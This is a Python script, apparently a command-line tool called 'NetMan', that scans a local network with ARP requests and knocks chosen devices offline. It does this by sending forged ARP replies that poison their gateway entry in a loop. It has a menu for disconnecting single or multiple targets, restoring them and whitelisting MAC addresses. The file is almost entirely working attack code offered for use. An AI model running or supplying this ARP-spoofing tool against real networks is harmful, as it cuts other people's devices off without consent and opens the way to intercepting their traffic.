import os
import time
import csv
import subprocess
import sys
from scapy.all import ARP, Ether, srp, sendp, conf, get_if_hwaddr

import ctypes

WHITELIST = set()
DISCONNECTED_DEVICES = set()
GATEWAY_IP = ""
GATEWAY_MAC = ""

def is_admin():
    if os.name == 'nt':  # Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:  # Unix/Linux
        return os.geteuid() == 0

def get_network_range():
    ip = conf.route.route("0.0.0.0")[1]
    return ip.rsplit('.', 1)[0] + ".1/24"

def get_gateway_info():
    gw_ip = conf.route.route("0.0.0.0")[2]
    arp_req = ARP(pdst=gw_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    result = srp(packet, timeout=2, verbose=0)[0]
    for _, received in result:
        return gw_ip, received.hwsrc
    return gw_ip, None

def ping_subnet(subnet="192.168.1.1/24"):
    base = subnet.rsplit('.', 1)[0]
    print("[~] Sending pings to wake up devices...")
    for i in range(1, 255):
        ip = f"{base}.{i}"
        if os.name == 'nt':  # Windows ping
            subprocess.Popen(["ping", "-n", "1", "-w", "1000", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:  # Linux/Mac ping
            subprocess.Popen(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_network():
    print("[+] Scanning network...")
    subnet = get_network_range()
    ping_subnet(subnet)
    time.sleep(2)  # Allow ARP cache to update

    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]

    devices = []
    seen_macs = set()

    for _, received in result:
        if received.hwsrc not in seen_macs:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            seen_macs.add(received.hwsrc)

    devices.sort(key=lambda d: d['ip'])
    return devices

def disconnect_device(ip, mac):
    print(f"[!] Disconnecting {ip} ({mac})")
    DISCONNECTED_DEVICES.add(ip)

    iface = conf.iface
    attacker_mac = get_if_hwaddr(iface)

    def loop():
        while ip in DISCONNECTED_DEVICES:
            arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=attacker_mac)
            ether = Ether(dst=mac, src=attacker_mac)
            packet = ether / arp
            sendp(packet, iface=iface, verbose=0)
            time.sleep(2)

    from threading import Thread
    Thread(target=loop, daemon=True).start()

def restore_device(ip, mac):
    print(f"[+] Restoring {ip} ({mac})")
    iface = conf.iface
    attacker_mac = get_if_hwaddr(iface)

    arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
    ether = Ether(dst=mac, src=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=iface, count=5, verbose=0)
    DISCONNECTED_DEVICES.discard(ip)

def save_to_csv(devices, filename="scan_results.csv"):
    with open(filename, "w", newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['IP Address', 'MAC Address'])
        for device in devices:
            writer.writerow([device['ip'], device['mac']])
    print(f"[+] Results saved to {filename}")

def main():
    global GATEWAY_IP, GATEWAY_MAC

    if not is_admin():
        print("[-] Please run this script with administrator/root privileges.")
        sys.exit()

    print("\n============================")
    print(r"""        
░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
  ____          _____  _    _ _       _____         _____  
 |  _ \        |  __ \| |  | | |     / ____|  /\   |  __ \ 
 | |_) |_   _  | |__) | |  | | |    | (___   /  \  | |__) |
 |  _ <| | | | |  ___/| |  | | |     \___ \ / /\ \ |  _  / 
 | |_) | |_| | | |    | |__| | |____ ____) / ____ \| | \ \ 
 |____/ \__, | |_|     \____/|______|_____/_/    \_\_|  \_\
         __/ |                                             
        |___/                                              
""")
    print("============================\n")

    GATEWAY_IP, GATEWAY_MAC = get_gateway_info()
    if not GATEWAY_MAC:
        print(f"[-] Could not retrieve MAC address for gateway {GATEWAY_IP}. Exiting.")
        sys.exit()

    print(f"[+] Default Gateway IP: {GATEWAY_IP}")
    print(f"[+] Default Gateway MAC: {GATEWAY_MAC}")

    while True:
        print("\n===== NetMan CLI Menu =====")
        print("1. Scan network")
        print("2. Disconnect a device")
        print("3. Restore a device")
        print("4. Disconnect multiple devices")
        print("5. Restore all")
        print("6. Whitelist a MAC address")
        print("7. Save scan to CSV")
        print("8. Exit")
        choice = input("Select an option: ")

        if choice == '1':
            devices = scan_network()
            for idx, device in enumerate(devices):
                print(f"{idx+1}. IP: {device['ip']:<15} MAC: {device['mac']}")

        elif choice == '2':
            ip = input("Enter target IP to disconnect: ")
            mac = input("Enter target MAC: ")
            if mac in WHITELIST:
                print("[-] Device is whitelisted.")
            else:
                disconnect_device(ip, mac)

        elif choice == '3':
            ip = input("Enter target IP to restore: ")
            mac = input("Enter target MAC: ")
            restore_device(ip, mac)

        elif choice == '4':
            count = int(input("How many devices to disconnect? "))
            for _ in range(count):
                ip = input("IP: ")
                mac = input("MAC: ")
                if mac not in WHITELIST:
                    disconnect_device(ip, mac)

        elif choice == '5':
            for ip in list(DISCONNECTED_DEVICES):
                mac = input(f"Enter MAC for {ip} to restore: ")
                restore_device(ip, mac)
            print("[+] Network restored.")

        elif choice == '6':
            mac = input("Enter MAC to whitelist: ")
            WHITELIST.add(mac)
            print("[+] Whitelisted.")

        elif choice == '7':
            devices = scan_network()
            save_to_csv(devices)

        elif choice == '8':
            print("[+] Exiting NetMan...")
            break

        else:
            print("[-] Invalid option. Try again.")

if __name__ == '__main__':
    main()
